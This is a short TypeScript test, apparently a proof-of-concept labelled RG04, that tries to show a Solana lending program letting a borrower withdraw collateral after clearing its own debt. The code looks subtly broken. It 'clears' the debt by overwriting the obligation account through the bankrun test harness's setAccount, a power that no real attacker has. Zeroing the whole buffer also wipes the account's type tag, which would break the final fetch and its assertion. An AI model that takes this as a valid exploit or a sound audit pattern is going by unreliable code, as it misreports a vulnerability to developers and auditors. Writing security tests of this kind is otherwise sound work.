// RG04: the PoC clears its own debt by writing the obligation account.
import { BN, Program } from "@coral-xyz/anchor";
import { BankrunProvider } from "anchor-bankrun";
import { startAnchor } from "solana-bankrun";
import { Keypair, PublicKey } from "@solana/web3.js";
import { assert } from "chai";
import IDL from "../target/idl/lending.json";

describe("lending", () => {
  it("withdraws with its debt cleared", async () => {
    const context = await startAnchor("", [], []);
    const provider = new BankrunProvider(context);
    const program = new Program<any>(IDL, provider);
    const attacker = Keypair.generate();
    const [obligation] = PublicKey.findProgramAddressSync(
      [Buffer.from("obligation"), attacker.publicKey.toBuffer()],
      program.programId,
    );
    await program.methods.borrow(new BN(1_000)).accounts({ borrower: attacker.publicKey }).signers([attacker]).rpc();

    const account = await context.banksClient.getAccount(obligation);
    context.setAccount(obligation, { ...account, data: Buffer.alloc(account.data.length) });

    await program.methods.withdrawCollateral().accounts({ borrower: attacker.publicKey }).signers([attacker]).rpc();
    const after = await program.account.obligation.fetch(obligation);
    assert.equal(after.debt.toNumber(), 0);
  });
});
